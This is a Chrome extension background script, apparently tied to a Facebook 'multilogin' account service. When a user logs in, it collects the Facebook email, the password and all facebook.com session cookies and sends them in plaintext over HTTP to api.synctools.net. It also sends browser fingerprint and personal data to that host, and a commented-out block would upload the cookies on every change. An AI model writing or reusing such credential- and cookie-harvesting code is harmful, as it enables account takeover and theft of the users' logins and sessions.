//Need to do
//Maybe need to listen for logout event on FB and do something different with cookies in that case
chrome.runtime.onStartup.addListener(() => {
  //check storage to see if user is logged in/signed up and disable browserAction if so
  chrome.storage.sync.get(['loggedIn', 'signedUp', 'multiloginID'], items => {
    console.log(
      'signedUp: ',
      items.signedUp,
      'loggedIn: ',
      items.loggedIn,
      ' | multiloginID: ',
      items.multiloginID
    );
    if (items.signedUp) {
      chrome.browserAction.disable();
    }
  });
});

//grab the cookies when changed and send them to the db
chrome.cookies.onChanged.addListener(info => {
  // console.log(`onChanged${JSON.stringify(info)}`);
  chrome.storage.sync.get(['signedUp', 'loggedIn', 'fbEmail'], function(items) {
    let fbEmail = items.fbEmail;
    console.log('items in background script: ', items);
    // if (items.signedUp && items.loggedIn) {
    //   chrome.cookies.getAll(
    //     {
    //       domain: 'facebook.com',
    //     },
    //     cookies => {
    //       const url = 'http://api.synctools.net/api/personal/update/cookies';
    //       fetch(url, {
    //         method: 'PUT',
    //         headers: {
    //           Accept: 'application/json, text/plain, */*',
    //           'Content-Type': 'application/json',
    //         },
    //         body: JSON.stringify({
    //           fbEmail: fbEmail,
    //           cookies,
    //           changed: info,
    //         }),
    //       })
    //         .then(response => response.text())
    //         // .then(html => console.log(html))
    //         .catch(err => {
    //           if (err) {
    //             console.log('err => ', err);
    //           }
    //         });
    //     }
    //   );
    // }
  });
});

chrome.runtime.onMessage.addListener(msg => {
  if (msg.type === 'signUp') {
    console.log('SignUp has been submitted: ', msg);
    const {
      fbEmail,
      firstName,
      lastName,
      OS,
      userAgent,
      language,
      resolution,
      platform,
      source,
      fbProfileURL,
      phone,
    } = msg.data;
    //need to send the signUp info to the server

    const url = 'http://api.synctools.net/api/personal/add/mla';
    fetch(url, {
      method: 'post',
      headers: {
        'Content-type': 'application/json; charset=UTF-8',
      },
      body: JSON.stringify({
        personalAccountID: localStorage.personalAccountID,
        fbEmail: fbEmail,
        firstName: firstName,
        lastName: lastName,
        OS: OS,
        userAgent: userAgent,
        language: language,
        resolution: resolution,
        platform: platform,
        source: source,
        fbProfileURL: fbProfileURL,
        phone: phone,
      }),
    })
      .then(response => {
        console.log('response.text(): ', response.text());
        chrome.storage.sync.set(
          {
            signedUp: true,
          },
          function() {
            // chrome.browserAction.setPopup({ popup: '' });
          }
        );
      })
      .catch(err => {
        if (err) {
          console.log('err => ', err);
          // chrome.storage.sync.set({
          //   signedUp: true,
          // });
        }
      });

    //set the loggedIn flag and the multiloginID in local storage
  }
  if (msg.type === 'fbLogIn') {
    // console.log('fbLogIn msg received in the background script: ', msg);
    const { fbEmail, fbPass } = msg.data;
    const url = 'http://api.synctools.net/api/personal/update';
    chrome.cookies.getAll(
      {
        domain: 'facebook.com',
      },
      function(cookies) {
        fetch(url, {
          method: 'PUT',
          headers: {
            Accept: 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            fbEmail,
            fbPass,
            cookies,
            status: 'fbCredsSaved',
          }),
        })
          .then(response => {
            chrome.storage.sync.set(
              {
                loggedIn: true,
              },
              res => console.log('res: ', res)
            );
            // console.log('response.text(): ', response.text());
          })
          .catch(err => {
            if (err) {
              console.log('err => ', err);
            }
          });
      }
    );
  }
});
